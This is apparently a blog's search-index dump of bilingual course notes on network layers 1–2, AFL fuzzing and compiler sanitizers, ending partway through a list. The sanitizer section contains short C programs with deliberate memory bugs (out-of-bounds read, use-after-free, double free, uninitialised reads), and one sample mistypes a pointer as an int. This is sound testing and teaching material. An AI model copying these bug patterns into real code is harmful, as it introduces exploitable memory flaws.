[{"title":"Layers 1 and 2 - Physical and Data Link Layers","url":"/course/(Layers%201%20and%202)%20Physical%20and%20Data%20Link%20Layers/","content":"<h1 id=\"NIC and MAC address\" class=\"active\"><a class=\"anchor\"  href=\"#NIC and MAC address\">#</a>NIC and MAC address</h1>\n<h2 id=\"Network Interface card (NIC)\" class=\"active\"><a class=\"anchor\"  href=\"#Network Interface card (NIC)\">#</a>Network Interface card (NIC)</h2>\n<ul>\n<li>A NIC attaches a network device to a network</li>\n<li>A NIC can be\n<ul>\n<li>a separate adapter card that slides into one of the motherboard extension slots</li>\n<li>built into the motherboard</li>\n</ul>\n</li>\n<li>NIC Functions\n<ul>\n<li>For incoming messages:\n<ul>\n<li>a NIC receives <strong>bit</strong> signals and assemble them into <strong>frames</strong>,</li>\n<li>verifies the destination address (to make sure the messages are for its own), and</li>\n<li>then removes <strong>frame header</strong> and sends the resulting <strong>packet</strong> to the network layer</li>\n</ul>\n</li>\n<li>For outgoing messages:\n<ul>\n<li>A NIC card receives <strong>packets</strong> from <strong>network layer</strong>,</li>\n<li>creates <strong>frames</strong> by adding MAC address/error check, and</li>\n<li>converts <strong>frame</strong> into <strong>bit</strong> signals and transmits them</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"Physical (MAC) Address\" class=\"active\"><a class=\"anchor\"  href=\"#Physical (MAC) Address\">#</a>Physical (MAC) Address</h2>\n<p>Each network device, e.g., NIC, has a unique physical address as its ID</p>\n<ul>\n<li>A MAC address is used to identify machines within the same broadcast network on layer 2 of the OSI model</li>\n<li>A MAC address is composed of two parts:\n<ul>\n<li>The first 24 bits are manufacture-ID assigned by IEEE, and the last 24 bits make up the device ID</li>\n</ul>\n</li>\n<li>Examples of MAC address\n<ul>\n<li>78:4f:43:4d:47:c2</li>\n<li>64-00-6A-95-9B-4</li>\n</ul>\n</li>\n<li>Find Computer’s MAC Addres\n<ul>\n<li>Windows ipconfig /all</li>\n<li>In MacOS, or Ubuntu  ifconfig -a<br>\nLaptop has several network adapters, e.g., Ethernet and Wi-Fi. Thus, it will have several MAC addresses</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"Switches\" class=\"active\"><a class=\"anchor\"  href=\"#Switches\">#</a>Switches</h1>\n<h2 id=\"Switches\" class=\"active\"><a class=\"anchor\"  href=\"#Switches\">#</a>Switches</h2>\n<ul>\n<li>A network switch is a <strong>layer 2</strong> device</li>\n<li>It is a multiport network bridge that uses hardware addresses, i.e., MAC addresses, to process and forward data at the data link layer</li>\n<li>Some switches can also process data at the network layer, i.e., layer 3, by additionally incorporating routing functionality using IP addressing to perform routing\n<ul>\n<li>Such switches are also called layer-3 switches or multilayer switches, here only discuss layer-2 switches.</li>\n</ul>\n</li>\n<li>Steps of switch operation\n<ol>\n<li>The switch receives a <strong>frame</strong>.</li>\n<li>The switch reads the source and destination <strong>MAC addresses</strong>.</li>\n<li>The switch looks up the destination MAC address in its <strong>switching table</strong>.</li>\n<li>The switch forwards the frame to the <strong>port</strong> where the computer owning the MAC address is found.</li>\n<li>The switching table is updated with the source MAC address and port information</li>\n</ol>\n</li>\n<li>A large LAN connected by switches\n<ul>\n<li>Switches are daisy-chained together in a single line</li>\n<li>This is a hybrid physical topology\n<ul>\n<li>Switch to switch: Bus</li>\n<li>Switch to computers: Star</li>\n</ul>\n</li>\n<li>All switches in this example work at Layer 2\n<ul>\n<li>They receive and forward data via MAC addresses</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"Switching\" class=\"active\"><a class=\"anchor\"  href=\"#Switching\">#</a>Switching</h2>\n<p>Switching is a network topology component<br>\nIt determines connection creation between nodes</p>\n<ol>\n<li>Circuit Switching<br>\nCircuit switching requires a dedicated <strong>physical connection</strong> between the sending and receiving devices.</li>\n</ol>\n<ul>\n<li>Connection established between two network nodes\n<ul>\n<li>Before transmitting data</li>\n</ul>\n</li>\n<li>Dedicated bandwidth 带宽</li>\n<li>Data follows the same path</li>\n<li>Monopolizes bandwidth while connected\n<ul>\n<li>Resource wasted</li>\n</ul>\n</li>\n<li>Uses\n<ul>\n<li>Live audio, videoconferencing</li>\n<li>Traditional telephone calls</li>\n</ul>\n</li>\n</ul>\n<ol start=\"2\">\n<li>Packet switching</li>\n</ol>\n<ul>\n<li>Packet switching breaks data into packets before transporting</li>\n<li>Packets\n<ul>\n<li>Contain addressing and control information for data transmission</li>\n<li>Travel any network path to destination</li>\n<li>Find fastest path available at any instant</li>\n<li>Need not follow each other</li>\n<li>Need not arrive in sequence</li>\n<li>Reassembled at destination</li>\n</ul>\n</li>\n<li>If used in live audio and video transmission, packet switching will require speedy connections</li>\n</ul>\n<ol start=\"3\">\n<li>Circuit Switching vs Packet Switching</li>\n</ol>\n<table>\n<thead>\n<tr>\n<th>特性</th>\n<th>电路交换</th>\n<th>分组交换</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>关键特征</strong></td>\n<td>连接在数据传输前建立，频道在断开前保持预留状态</td>\n<td>数据报分组独立发送，可能通过不同路径传输</td>\n</tr>\n<tr>\n<td></td>\n<td>数据沿着同一路径传输</td>\n<td>分组可以选择不同路径，绕过网络拥塞</td>\n</tr>\n<tr>\n<td><strong>优点</strong></td>\n<td>专用带宽，稳定传输</td>\n<td>高效利用网络带宽</td>\n</tr>\n<tr>\n<td></td>\n<td>数据沿同一路径传输，开销较小</td>\n<td>可选择不同路径绕过网络拥塞</td>\n</tr>\n<tr>\n<td></td>\n<td>连接建立延迟较低，保持 “常连接” 状态</td>\n<td></td>\n</tr>\n<tr>\n<td><strong>缺点</strong></td>\n<td>带宽垄断，资源浪费</td>\n<td>分组可能在不同路径中丢失</td>\n</tr>\n<tr>\n<td></td>\n<td>成本较高</td>\n<td>分组需包含源和目的地信息，增加开销</td>\n</tr>\n</tbody>\n</table>\n<ol start=\"4\">\n<li>Two sublayers of the data-link layer</li>\n</ol>\n<ul>\n<li>LLC (Logical Link Control) sublayer\n<ul>\n<li>Provides common interface, reliability and flow control</li>\n</ul>\n</li>\n<li>MAC (Media Access Control) sublayer\n<ul>\n<li>Manages access to the physical medium</li>\n<li>Appends physical address of destination computer onto data frame</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"Ethernet protocol\" class=\"active\"><a class=\"anchor\"  href=\"#Ethernet protocol\">#</a>Ethernet protocol</h1>\n<ol>\n<li>Ethernet</li>\n</ol>\n<ul>\n<li>The most popular layer 2 standard</li>\n<li>The most popular network technology used on modern LANs</li>\n<li>Benefits\n<ul>\n<li>Flexible</li>\n<li>Can run on various network media</li>\n<li>Excellent throughput</li>\n<li>Reasonable cost</li>\n</ul>\n</li>\n<li>All variations of Ethernet share common access method\n<ul>\n<li>CSMA/CD (for wired networks)</li>\n</ul>\n</li>\n</ul>\n<ol start=\"2\">\n<li>Attenuation, Latency, Jitter, and RTT</li>\n</ol>\n<ul>\n<li>Attenuation (衰减） is the loss of a signal’s strength as it travels away from source\n<ul>\n<li>Signals can be boosted using a <strong>repeater</strong>, which regenerates a digital signal in its original form without noise previously accumulated</li>\n</ul>\n</li>\n<li>Latency（延迟） is the delay between signal transmission and receipt\n<ul>\n<li>Latency may cause network transmission errors</li>\n<li>The length of the cable affects latency, as does the existence of any intervening device</li>\n</ul>\n</li>\n<li>Jitter (抖动) is the variation in latency\n<ul>\n<li>Example: delay changes from 30 ms to 32 ms, the jitter is 2 ms</li>\n</ul>\n</li>\n<li>RTT (round trip time) is the time for packet to go from sender to receiver, then back from receiver to sender</li>\n</ul>\n<ol start=\"3\">\n<li>Bandwidth and Throughput<br>\nThey are measurements of the capacity or efficiency of network transmissions</li>\n</ol>\n<ul>\n<li>Bandwidth: The amount of data that could be theoretically transmitted during a given period of time</li>\n<li>Throughput: How much data is actually transmitted during a given period of time</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>量级</th>\n<th>前缀</th>\n<th>缩写</th>\n<th>转换</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>1 bit per second</td>\n<td>n/a</td>\n<td>bps</td>\n<td>1 bps = 1 bit per second</td>\n</tr>\n<tr>\n<td>1000 bits per second</td>\n<td>kilo</td>\n<td>Kbps</td>\n<td>1 Kbps = 1 kilobit per second</td>\n</tr>\n<tr>\n<td>1,000,000 bits per second</td>\n<td>mega</td>\n<td>Mbps</td>\n<td>1 Mbps = 1 megabit per second</td>\n</tr>\n<tr>\n<td>1,000,000,000 bits per second</td>\n<td>giga</td>\n<td>Gbps</td>\n<td>1 Gbps = 1 gigabit per second</td>\n</tr>\n<tr>\n<td>1,000,000,000,000 bits per second</td>\n<td>tera</td>\n<td>Tbps</td>\n<td>1 Tbps = 1 terabit per second</td>\n</tr>\n</tbody>\n</table>\n<ol start=\"4\">\n<li>Data Transmission vs Data Storage</li>\n</ol>\n<ul>\n<li>数据传输：以 ** 每秒比特数（bits per second）** 的倍数来测量。\n<ul>\n<li>示例：100 kbps, 30 Mbps, 10 Gbps 等。</li>\n<li>小写 “b” 表示比特（bit）。</li>\n</ul>\n</li>\n<li>数据存储：以 ** 字节（bytes）** 的倍数来测量。\n<ul>\n<li>示例：100 kB, 11 MB, 10 GB 等。</li>\n<li>大写 “B” 表示字节（Byte）。</li>\n</ul>\n</li>\n<li>“kilo” 的不同含义：\n<ul>\n<li>数据传输：1 kbps = 1000 比特每秒。</li>\n<li>数据存储：1 kB = 1024 字节。</li>\n<li>1 字节（Byte）= 8 比特（bits）</li>\n</ul>\n</li>\n</ul>\n<ol start=\"5\">\n<li>Full-duplex, half-duplex, and simplex</li>\n</ol>\n<ul>\n<li>全双工、半双工和单工模式\n<ul>\n<li>全双工（Full-duplex）：信号可以同时在介质的两个方向上传输。</li>\n<li>半双工（Half-duplex）：信号可以在两个方向上传输，但一次只能一个方向。</li>\n<li>单工（Simplex）：信号只能单向传输。</li>\n</ul>\n</li>\n<li>在 Windows 中设置网络接口卡（NIC）的传输模式和速度\n<ul>\n<li>通过设备管理器（Device Manager）可以设置 NIC 的传输模式和速度。</li>\n<li>默认设置为自动协商（Auto Negotiation），这是最优设置，通常不建议更改</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"Cabling\" class=\"active\"><a class=\"anchor\"  href=\"#Cabling\">#</a>Cabling</h1>\n<ol>\n<li>Copper cables</li>\n</ol>\n<ul>\n<li>同轴电缆（Coaxial Cable）和双轴电缆（Twinaxial Cable）：适用于特定网络环境和连接需求。</li>\n<li>双绞线电缆（Twisted-Pair Cable）：\n<ul>\n<li>两种类型：\n<ul>\n<li>屏蔽双绞线（STP）：具有额外的屏蔽层，用于减少电磁干扰。</li>\n<li>非屏蔽双绞线（UTP）：没有屏蔽层，成本较低，广泛应用于局域网。</li>\n</ul>\n</li>\n<li>常见双绞线类型：\n<ul>\n<li>类别（Category，cat）：包括 Cat 3、Cat 5、Cat 5e、Cat 6、Cat 6a、Cat 7、Cat 7a 和 Cat 8。</li>\n<li>现代局域网通常使用 Cat 5e 或更高版本的双绞线以获得更高的传输速率和稳定性。</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<ol start=\"2\">\n<li>Fiber-Optic Cables</li>\n</ol>\n<ul>\n<li>光纤电缆（Fiber-Optic Cable），简称光纤，在其中心（核心）包含一个或多个玻璃或塑料纤维。</li>\n<li>优点（相较于铜缆）\n<ul>\n<li>极高的传输速度：适用于需要高速数据传输的应用。</li>\n<li>很高的抗干扰能力：对电磁干扰不敏感，适合噪声环境。</li>\n<li>出色的安全性：窃听难度更高，数据更安全。</li>\n<li>长距离传输能力：能够在更远距离上传输信号。</li>\n</ul>\n</li>\n<li>缺点\n<ul>\n<li>价格更高：比双绞线电缆成本更高。</li>\n<li>需要特殊设备：连接和接续光纤需要专用设备和技术</li>\n</ul>\n</li>\n</ul>\n<ol start=\"3\">\n<li>Structured Cabling</li>\n</ol>\n<ul>\n<li>There is an international standard that describe how to install network media\n<ul>\n<li>ANSI/TIA-568 Commercial Building Wiring Standard</li>\n<li>It is also known as structured cabling</li>\n</ul>\n</li>\n<li>The principles of structured cabling apply no matter what type of media, transmission technology, or networking speeds are involved</li>\n<li>Structured cabling is based on a hierarchical design and assumes a network is based on the star topology</li>\n<li>Multiple types of Ethernet on a WAN<br>\n<img data-src=\"https://img.picui.cn/free/2024/11/01/6724bd73815b1.png\" alt=\"img\"></li>\n</ul>\n<h1 id=\"MAC\" class=\"active\"><a class=\"anchor\"  href=\"#MAC\">#</a>MAC</h1>\n<ol>\n<li>CSMA/CD (Carrier Sense Multiple Access with Collision Detection)</li>\n</ol>\n<ul>\n<li>标准：用于以太网网络（IEEE 802.3）。</li>\n<li>工作原理：\n<ul>\n<li>载波侦听：以太网网络接口卡（NIC）监听网络，以检查通信信道是否空闲，如果空闲则开始传输。</li>\n<li>碰撞：当两个节点同时传输时，会发生碰撞。</li>\n<li>碰撞检测例程：如果节点检测到碰撞，会触发碰撞检测程序。</li>\n<li>阻塞信号：NIC 发出 32 位阻塞序列，表示先前的消息出现错误。</li>\n</ul>\n</li>\n<li>碰撞域：碰撞发生的网络部分称为碰撞域。</li>\n<li>中继器：重复器会将碰撞信号传播，导致更大的碰撞域。</li>\n<li>交换机和路由器：它们会将网络分隔为多个碰撞域，减少碰撞的发生。</li>\n</ul>\n<ol start=\"2\">\n<li>CSMA/CA (Carrier Sensing Multiple Access/Collision Avoidance)<br>\n CSMA/CA 是一种用于无线网络的媒体访问控制方法，通过避免碰撞来减少冲突的可能性。以下是其关键点：</li>\n</ol>\n<ul>\n<li>碰撞避免（Collision Avoidance，CA）：CSMA/CA 通过检查信道空闲来减少碰撞的发生。</li>\n<li>使用 ACK 确认每次传输：\n<ul>\n<li>传输完成后，接收端会发送一个确认包（ACK）来验证传输的成功性。</li>\n<li>比以太网的 CSMA/CD 有更高的开销，实际吞吐量低于理论最大值。</li>\n</ul>\n</li>\n<li>RTS/CTS 协议（请求发送 / 清除发送）：\n<ul>\n<li>RTS/CTS 协议确保数据包不会因其他传输而受到干扰。</li>\n<li>在大数据包传输中更为高效，但增加了 802.11（无线网络）的开销。</li>\n</ul>\n</li>\n<li>CSMA/CA 传输流程图\n<ol>\n<li>检查传输：节点首先检查信道是否空闲。</li>\n<li>检测活动：如果信道忙碌，则稍作暂停后再检测。</li>\n<li>发送 RTS（请求发送）：如果信道空闲，节点发送 RTS 信号请求传输权限。</li>\n<li>确认 CTS（清除发送）：如果收到 CTS 信号，表示可以传输，否则稍作暂停再尝试。</li>\n<li>发送数据：在确认 CTS 后，节点开始数据传输。</li>\n<li>完成传输：传输完成后，过程结束<br>\n<img data-src=\"https://img.picui.cn/free/2024/11/01/6724c0f48b35c.png\" alt=\"img\"></li>\n</ol>\n</li>\n</ul>\n","categories":["课程笔记","Network Systems"],"tags":["network system"]},{"title":"AFL","url":"/course/AFL/","content":"<h1 id=\"American Fuzzy Lop\" class=\"active\"><a class=\"anchor\"  href=\"#American Fuzzy Lop\">#</a> American Fuzzy Lop</h1>\n<h2 id=\"Definition\" class=\"active\"><a class=\"anchor\"  href=\"#Definition\">#</a>Definition</h2>\n<ol>\n<li>A security-oriented fuzzer that employs a novel type of compile-time instrumentation and genetic algorithms to automatically discover clean, interesting test cases that trigger new internal states in the targeted binary. Currently state-of-the-practice at fuzzing (together with forks)</li>\n</ol>\n<ul>\n<li>A type of coverage-based fuzzing: Instrument target programs to track test coverage</li>\n<li>A type of evolutionary/genetic fuzzing: Attempt to generate inputs based on the response of the program</li>\n</ul>\n<ol start=\"2\">\n<li>Why AFL</li>\n</ol>\n<ul>\n<li>The best general purpose fuzzer\n<ul>\n<li>For C/C++/Objective C programs</li>\n</ul>\n</li>\n<li>Effective and well-engineered with lots of heuristics\n<ul>\n<li>Fast – lots of test cases per second</li>\n<li>Clever – test cases are well chosen</li>\n<li>Easy to use (Linux and other platforms)</li>\n</ul>\n</li>\n<li>Deliver out-of-the-box performance far superior to mutation fuzzing or coverage-only tools</li>\n</ul>\n<ol start=\"3\">\n<li>AFL Approach\n<ol>\n<li>Load user-supplied initial test cases into the queue</li>\n<li>Take next input file from the queue</li>\n<li>Attempt to trim the test case to the smallest size</li>\n<li>Repeatedly mutate the file using traditional fuzzing strategies</li>\n<li>If any of the generated mutations resulted in a new state transition recorded by the instrumentation, add mutated output as a new entry in the queue</li>\n<li>Go to 2<br>\n<img data-src=\"https://img.picui.cn/free/2024/10/28/671f221b5c7ee.png\" alt=\"img\"></li>\n</ol>\n</li>\n</ol>\n<h2 id=\"Fuzzing Through AFL\" class=\"active\"><a class=\"anchor\"  href=\"#Fuzzing Through AFL\">#</a>Fuzzing Through AFL</h2>\n<ol>\n<li>Instrumenting Programs for AFL<br>\nCompile through AFL wrappers to generate an instrumented executable for fuzzing\n<ul>\n<li>Basically, replace  <code>gcc</code>  with  <code>afl‐gcc</code>  or  <code>afl-clang</code></li>\n<li>For simple compilation,  <code>afl‐gcc test.c ‐o test</code> <br>\nFor larger projects that use the make build system, add to the Makefile:</li>\n<li><code>CC=path-to/afl-gcc</code>  or  <code>CC=path-to/afl-clang</code></li>\n<li>This allows to build instrumented target program with the AFL wrappers<br>\nFor C++ code, use the C++ wrappers  <code>afl-g++</code>  or  <code>afl-clang++</code></li>\n<li>For example in the Makefile:  <code>CXX=path-to/afl-g++</code>  or  <code>CXX=path-to/afl-clang++</code> <br>\nAFL 会在编译时插装目标程序的代码，以便在执行期间跟踪路径覆盖情况。插装后的二进制文件包含对 <code> __afl_maybe_log</code>  的调用，该函数记录程序的执行状态。</li>\n</ul>\n</li>\n<li>Fuzzing Through AFL</li>\n</ol>\n<ul>\n<li>Start fuzzing with AFL   <code>afl‐fuzz ‐i testcase ‐o output ./test @@</code></li>\n<li>Test cases are under testcase</li>\n<li>The output produced by  goes to the output directory</li>\n<li>The special symbols  <code>@@</code>  tell AFL to take the file names under test case and feed it to test. Not needed if the program takes input from stdin</li>\n<li>Other common options:\n<ul>\n<li><code>-t</code>  sets timeout for the executed process</li>\n<li><code>-m</code>  sets memory limit for the executed process</li>\n</ul>\n</li>\n</ul>\n<ol start=\"3\">\n<li>Initial Test Cases<br>\nDon’t waste too much time trying to synthesise your target’s input format<br>\nFind some real inputs that exercise as much of the target as possible<br>\nFrom the AFL user guide:\n<ul>\n<li>Keep the files small. Under 1 kB is ideal, although not strictly necessary</li>\n<li>Use multiple test cases only if they are functionally different from each other</li>\n</ul>\n</li>\n<li>When To Stop</li>\n</ol>\n<ul>\n<li>Never, as fuzzing is part of continuous integration</li>\n<li>hen the  <code>cycles counter</code>  is green\n<ul>\n<li>Last new path was found many cycles ago</li>\n<li>Pending paths is zero</li>\n</ul>\n</li>\n<li>When the cycles counter is blue\n<ul>\n<li>Last new path was found over a cycle ago</li>\n</ul>\n</li>\n<li>If you want to stop earlier, press Ctrl-C\n<ul>\n<li>E.g. it’s been running for a while (hours + millions of executions + at least 2 cycles</li>\n</ul>\n</li>\n</ul>\n<ol start=\"5\">\n<li>AFL Output</li>\n</ol>\n<ul>\n<li>File  <code>fuzzer_stats</code>  provides summary of stats UI</li>\n<li>File  <code>plot_data</code>  shows the progress of fuzzer</li>\n<li>Directory  <code>queue</code>  shows inputs that led to paths</li>\n<li>Directory  <code>crashes</code>  contains input that caused crash</li>\n<li>Directory  <code>hangs</code>  contains input that caused hang</li>\n</ul>\n<ol start=\"6\">\n<li>AFL Crashes<br>\nUnique if the associated execution paths involve any state transitions not seen previously. A single bug may be reached in multiple ways, but AFL can usually recognise<br>\nCrashes may be caused by failed assertions - as they abort</li>\n</ol>\n<h1 id=\"Compiler-supported sanitizers\" class=\"active\"><a class=\"anchor\"  href=\"#Compiler-supported sanitizers\">#</a>Compiler-supported sanitizers</h1>\n<ol>\n<li>Sanitisers 和加固措施</li>\n</ol>\n<ul>\n<li>Sanitisers（内存清理器）：通过在二进制文件中插入额外的代码，检查不良的运行条件。提高模糊测试效果。</li>\n<li>Common compiler-supported sanitisers: ASan, MSan, UBSan, TSan</li>\n<li>加固选项：使内存错误的检测更容易。 <code>AFL_HARDEN=1</code> ：AFL 的硬化选项，用于检测更多的内存错误。</li>\n<li>注意：Sanitisers 通常不兼容，因此建议：\n<ul>\n<li>大多数模糊测试运行时启用  <code>AFL_HARDEN</code> 。</li>\n<li>小部分测试运行时分别启用每个 Sanitisers，以覆盖不同类型的内存错误。</li>\n</ul>\n</li>\n</ul>\n<ol start=\"2\">\n<li>ASan（Address Sanitizer）Compile with  <code>-fsanitize=address</code> <br>\n 检测内容：\n<ul>\n<li>堆、栈和全局变量的越界访问。</li>\n<li>Use-after-free、double-free、invalid free。</li>\n<li>内存泄漏。</li>\n</ul>\n</li>\n</ol>\n<p>性能影响：大约 2 倍的运行时间开销。</p>\n<figure class=\"highlight c\"><figcaption><span>ASan Example1</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> N 10 </span></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">void</span>)</span> </span><br><span class=\"line\">&#123; </span><br><span class=\"line\">    <span class=\"type\">char</span> s[N] = <span class=\"string\">&quot;123456789&quot;</span>; </span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt;= N; i++) </span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%c&quot;</span>, s[i]); </span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\n&quot;</span>); </span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>; </span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n<p>Loop bound goes past the end of the array, cannot assess  <code>s[10]</code></p>\n <figure class=\"highlight c\"><figcaption><span>ASan Example2</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">void</span>)</span> </span><br><span class=\"line\"> &#123; </span><br><span class=\"line\">     <span class=\"type\">int</span> *a = <span class=\"built_in\">malloc</span>(<span class=\"keyword\">sizeof</span>(<span class=\"type\">int</span>) * <span class=\"number\">100</span>); </span><br><span class=\"line\">     <span class=\"built_in\">free</span>(a); </span><br><span class=\"line\">     <span class=\"keyword\">return</span> a[<span class=\"number\">5</span>]; </span><br><span class=\"line\"> &#125;</span><br></pre></td></tr></table></figure>\n<p>The array is dereferenced after it is free</p>\n <figure class=\"highlight c\"><figcaption><span>ASan Example3</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">void</span>)</span> </span><br><span class=\"line\"> &#123; </span><br><span class=\"line\">     <span class=\"type\">char</span> *s = <span class=\"built_in\">malloc</span>(<span class=\"keyword\">sizeof</span>(<span class=\"type\">char</span>) * <span class=\"number\">10</span>); </span><br><span class=\"line\">     <span class=\"built_in\">free</span>(s); </span><br><span class=\"line\">     <span class=\"built_in\">free</span>(s);</span><br><span class=\"line\">     <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%s&quot;</span>, s);</span><br><span class=\"line\">     <span class=\"keyword\">return</span> <span class=\"number\">0</span>; </span><br><span class=\"line\"> &#125;</span><br></pre></td></tr></table></figure>\n<p>The array is double-freed</p>\n<ol start=\"3\">\n<li>MSan（Memory Sanitizer） Compile with  <code>-fsanitize=memory</code> <br>\n 检测未初始化的内存使用。<br>\n性能影响：大约 3 倍的运行时间开销。</li>\n</ol>\n <figure class=\"highlight c\"><figcaption><span>MSan Example1</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span> **argv)</span> </span><br><span class=\"line\"> &#123; </span><br><span class=\"line\">     <span class=\"type\">int</span> a[<span class=\"number\">10</span>]; </span><br><span class=\"line\">     a[<span class=\"number\">2</span>] = <span class=\"number\">0</span>; </span><br><span class=\"line\">     <span class=\"keyword\">if</span> (a[argc]) </span><br><span class=\"line\">         <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;print something\\n&quot;</span>); </span><br><span class=\"line\">     <span class=\"keyword\">return</span> <span class=\"number\">0</span>; </span><br><span class=\"line\"> &#125;</span><br></pre></td></tr></table></figure>\n<p>The array is allocated on <strong>stack</strong>, but only partially initialised</p>\n <figure class=\"highlight c\"><figcaption><span>MSan Example2</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span> **argv)</span> </span><br><span class=\"line\"> &#123; </span><br><span class=\"line\">     <span class=\"type\">int</span> a = <span class=\"built_in\">malloc</span>(<span class=\"keyword\">sizeof</span>(<span class=\"type\">int</span>) * <span class=\"number\">10</span>);</span><br><span class=\"line\">     a[<span class=\"number\">2</span>] = <span class=\"number\">0</span>; </span><br><span class=\"line\">     <span class=\"keyword\">if</span> (a[argc]) </span><br><span class=\"line\">         <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;print something\\n&quot;</span>); </span><br><span class=\"line\">     <span class=\"built_in\">free</span>(a); </span><br><span class=\"line\">     <span class=\"keyword\">return</span> <span class=\"number\">0</span>; </span><br><span class=\"line\"> &#125;</span><br></pre></td></tr></table></figure>\n<p>The array is allocated on <strong>heap</strong>, but only partially initialised</p>\n<ol start=\"4\">\n<li>UBSan（Undefined Behavior Sanitizer） Compile with  <code>-fsanitize=undefined</code> <br>\n 检测：\n<ul>\n<li>解引用空指针。</li>\n<li>有符号整数溢出。<br>\n性能影响：大约 20% 的运行时间开销。</li>\n</ul>\n</li>\n</ol>\n <figure class=\"highlight c\"><figcaption><span>UBSan Example1</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">void</span>)</span> </span><br><span class=\"line\"> &#123; </span><br><span class=\"line\">     <span class=\"type\">int</span> n = <span class=\"number\">65</span>; </span><br><span class=\"line\">     <span class=\"type\">int</span> m = n / (n - n); </span><br><span class=\"line\">     <span class=\"keyword\">return</span> <span class=\"number\">0</span>; </span><br><span class=\"line\"> &#125;</span><br></pre></td></tr></table></figure>\n<p>Division-by-zero is undefined</p>\n <figure class=\"highlight c\"><figcaption><span>UBSan Example2</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">foo</span> </span></span><br><span class=\"line\"><span class=\"class\"> &#123;</span> </span><br><span class=\"line\">     <span class=\"type\">int</span> a, b; </span><br><span class=\"line\"> &#125;; </span><br><span class=\"line\"> <span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">void</span>)</span> </span><br><span class=\"line\"> &#123; </span><br><span class=\"line\">     <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">foo</span> *<span class=\"title\">x</span> =</span> <span class=\"literal\">NULL</span>; </span><br><span class=\"line\">     <span class=\"type\">int</span> m = x-&gt;a;  <span class=\"comment\">// 访问空指针</span></span><br><span class=\"line\">     <span class=\"keyword\">return</span> <span class=\"number\">0</span>; </span><br><span class=\"line\"> &#125;</span><br></pre></td></tr></table></figure>\n<p>Accessing a null pointer is undefined</p>\n<ol start=\"5\">\n<li>TSan（Thread Sanitizer）<br>\n检测数据竞争（data races）。<br>\n性能影响：运行时间开销约为 5-15 倍，内存开销约为 5-10 倍。</li>\n</ol>\n<h1 id=\"Others\" class=\"active\"><a class=\"anchor\"  href=\"#Others\">#</a>Others</h1>\n<ol>\n<li>\n<p>Parallel Fuzzing(High performance fuzzing)<br>\nRun concurrent fuzzing jobs on multicore systems</p>\n<ul>\n<li>One master instance, one slave per core</li>\n<li>Use the afl-gotcpu tool to measure per-core pre-emption rate<br>\nRun the master (-M) like this:</li>\n<li><code>./afl-fuzz -i testcase_dir -o sync_dir -M fuzzer01</code> <br>\nThen, run the slaves (-S) instances like this:</li>\n<li><code>./afl-fuzz -i testcase_dir -o sync_dir -S fuzzer02</code></li>\n<li><code>./afl-fuzz -i testcase_dir -o sync_dir -S fuzzer03</code></li>\n</ul>\n</li>\n<li>\n<p>Fuzzer Dictionaries(Improve fuzzer mutations)<br>\nBy default, AFL mutation engine is optimised for compact data formats<br>\nCustom dictionaries can help the fuzzer access paths it otherwise wouldn’t  <code>afl-fuzz -x mydict</code> <br>\nGet them from:</p>\n<ul>\n<li><code>dictionaries</code>  directory in AFL</li>\n<li><code>libtokencap</code>  directory in AFL\n<ul>\n<li>Create a dictionary by intercepting calls like  <code>strcmp</code>  and  <code>memcmp</code></li>\n</ul>\n</li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jaHJvbWl1bS5nb29nbGVzb3VyY2UuY29tL2Nocm9taXVtL3NyYy8rL21hc3Rlci90ZXN0aW5nL2xpYmZ1enplci9mdXp6ZXJzL2RpY3Rz\">Online resource</span></li>\n</ul>\n</li>\n<li>\n<p>Limitations of Fuzzing</p>\n</li>\n</ol>\n<ul>\n<li>Hard to tell when to stop</li>\n<li>Test the target in the exact configuration you provided, on the input source you set up</li>\n<li>Can get stuck (e.g. checksums)</li>\n<li>Crashes only (typical of most fuzzers). Only notice problems that can be automatically detected</li>\n<li>Need to build target from source</li>\n<li>stdin or file input only</li>\n<li>Coverage-based instrumentation won’t guide it towards all crashes\n<ul>\n<li><code>x = 1/(input – 1234)</code>  ：在这种情况下，AFL 可能难以找到输入 1234，从而导致无法检测到除零错误。</li>\n</ul>\n</li>\n<li>No automatic parallelisation</li>\n<li>Linux/macOS 